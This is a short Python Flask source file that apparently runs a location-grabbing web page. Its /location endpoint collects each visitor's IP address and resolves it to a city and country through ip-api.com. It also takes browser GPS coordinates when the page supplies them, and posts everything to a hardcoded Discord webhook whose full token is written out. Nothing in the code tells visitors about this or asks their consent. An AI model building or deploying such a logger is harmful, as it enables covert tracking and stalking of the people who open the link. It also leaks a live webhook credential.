from flask import Flask, request, jsonify, render_template
import requests
webhook_url = 'https://discord.com/api/webhooks/1374846820961751120/9XXOF7xHwKPCaTerUAyvP6_onjW66wmxYfI4d3lyGSVeItBYw_88quDm48IYlETrT7A2'

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/location', methods=['POST'])
def get_location():
    data = request.get_json(force=True)
    print("Received data:", data)
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    ip_info = requests.get(f'http://ip-api.com/json/{ip}').json()

    lat = data.get('lat')
    lon = data.get('lon')

    content = f"IP: {ip}\n"
    content += f"IP Location: {ip_info.get('city', 'N/A')}, {ip_info.get('country', 'N/A')} ({ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')})\n"

    lat = data.get('lat')
    lon = data.get('lon')
    
    if lat is not None and lon is not None:
        content += f"GPS: {lat}, {lon}"
    else:
        content += "GPS: Not provided"

    msg = {"content": content}

    res = requests.post(webhook_url, json=msg)
    print("Discord response:", res.status_code, res.text)

    return jsonify({"status": "sent"})

if __name__ == '__main__':
    app.run()
